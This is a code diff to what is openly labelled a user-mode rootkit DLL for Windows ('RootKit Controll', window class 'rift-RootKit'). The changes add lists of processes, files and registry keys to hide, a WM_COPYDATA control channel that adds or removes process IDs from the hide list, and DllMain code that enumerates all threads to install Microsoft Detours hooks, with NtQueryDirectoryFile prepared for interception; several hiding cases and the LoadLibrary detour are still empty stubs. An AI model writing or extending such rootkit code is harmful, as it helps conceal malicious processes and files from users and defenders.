@@ -1,5 +1,9 @@
 #include "riftrk.h"
 
+vec::OptiVec ProcessList;
+vec::OptiVec FileList;
+vec::OptiVec RegistryList;
+
 struct IOCtlTCtx {
 	HINSTANCE hInstDll;
 	HANDLE hReadEvent;
@@ -7,21 +11,31 @@ struct IOCtlTCtx {
 
 // RootKit Controll
 namespace rkc {
-	LRESULT __stdcall IOCtlHandler(
+	long __stdcall IOCtlHandler(
 		_In_     HWND   hWnd,
 		_In_     uint32 uMsg,
-		_In_opt_ WPARAM wParam,
-		_In_opt_ LPARAM lParam
+		_In_opt_ long   wParam,
+		_In_opt_ long   lParam
 	) {
 		switch (uMsg) {
-		case WM_COPYDATA: {
+		case WM_COPYDATA: // IPC Message
+			{
 				COPYDATASTRUCT* pcd = (COPYDATASTRUCT*)lParam;
 			#define IOCTLLID(fd, id) ((fd << 4) | (id & 0xf))
 				switch (pcd->dwData) {
 				case IOCTLLID(0, 0): // Add Process to hide
-					break;
+					*(uint32*)ProcessList.AllocateObject(4) = *(uint32*)pcd->lpData; break;
 				case IOCTLLID(0, 1): // Remove Process to hide
-					break;
+					{
+						ProcessList.LockVector();
+						uint32* id = (uint32*)ProcessList.GetFirstEntry();
+						do {
+							if (*id == *(uint32*)pcd->lpData) {
+								ProcessList.FreeObject(id); break;
+							}
+						} while (id = (uint32*)ProcessList.GetNextEntry(id));
+						ProcessList.UnlockVector();
+					} break;
 
 				case IOCTLLID(1, 0): // Add File/Directory to hide
 					break;
@@ -51,7 +65,7 @@ namespace rkc {
 	) {
 		WNDCLASSEXW wc{};
 		wc.cbSize = sizeof(wc);
-		wc.lpfnWndProc = IOCtlHandler;
+		wc.lpfnWndProc = (WNDPROC)IOCtlHandler;
 		wc.lpszClassName = L"rift-RootKit(rk)/process:0000";
 		wc.hInstance = ((IOCtlTCtx*)lpParameter)->hInstDll;
 
@@ -84,6 +98,8 @@ namespace rkc {
 	}
 }
 
+extern NtQueryDirectoryFile_t NtQueryDirectoryFileO;
+
 BOOL WINAPI DllMain(
 	_In_ HINSTANCE hinstDLL,
 	_In_ dword     fdwReason,
@@ -96,19 +112,66 @@ BOOL WINAPI DllMain(
 	switch (fdwReason) {
 	case DLL_PROCESS_ATTACH:
 		{
-			HANDLE h[2];
-			h[0] = CreateEventW(nullptr, false, false, nullptr);
-			IOCtlTCtx ctx = { hinstDLL, h[0] };
-			h[1] = CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)rkc::IOCtlSetup, &ctx, 0, nullptr);
+			{	// Setup IOCtl Handling (RootKit Control)
+				HANDLE h[2];
+				h[0] = CreateEventW(nullptr, false, false, nullptr);
+				IOCtlTCtx ctx = { hinstDLL, h[0] };
+				h[1] = CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)rkc::IOCtlSetup, &ctx, 0, nullptr);
 
-			WaitForMultipleObjects(2, h, false, INFINITE);
-			CloseHandle(h[0]);
+				WaitForMultipleObjects(2, h, false, INFINITE);
+				CloseHandle(h[0]);
 
-			dword ThreadExitCode;
-			GetExitCodeThread(h[1], &ThreadExitCode);
-			if (ThreadExitCode == STILL_ACTIVE)
-				return true;
-			return false; // Indicated that something failed to load
+				dword ThreadExitCode;
+				GetExitCodeThread(h[1], &ThreadExitCode);
+				CloseHandle(h[1]);
+				if (ThreadExitCode != STILL_ACTIVE)
+					return false; // Indicated that something failed to load
+			} {	// Setup Hooks ()
+
+				// Update all Threads
+				HANDLE hTSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+				if (hTSnap == INVALID_HANDLE_VALUE)
+					return false; // Invalid Snap
+				THREADENTRY32 te;
+				te.dwSize = sizeof(te);
+
+				HANDLE* hThread = nullptr;
+				uint16 nThread = 0;
+				if (Thread32First(hTSnap, &te)) {
+					if (DetourTransactionBegin())
+						return false; // Couldn't Start Transaction
+					do {
+						// Do not Update Current Thread
+						if (te.th32ThreadID == GetCurrentThreadId())
+							continue;
+
+						if (hThread)
+							hThread = (HANDLE*)realloc(hThread, (nThread + 1) * sizeof(HANDLE));
+						else
+							hThread = (HANDLE*)malloc((nThread + 1) * sizeof(HANDLE));
+
+						hThread[nThread] = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
+						DetourUpdateThread(hThread[nThread]);
+						nThread++;
+					} while (Thread32Next(hTSnap, &te));
+				} else {
+					CloseHandle(hTSnap);
+					return false; // Couldn't Find Threads
+				}
+
+				// Detour LoadLibrary Functions
+
+
+				DetourTransactionCommit();
+
+				// CleanUp
+				for (uchar i = 0; i < nThread; i++)
+					CloseHandle(hThread[i]);
+				CloseHandle(hTSnap);
+
+			}
+
+			return true;
 		}
 
 	case DLL_THREAD_ATTACH:
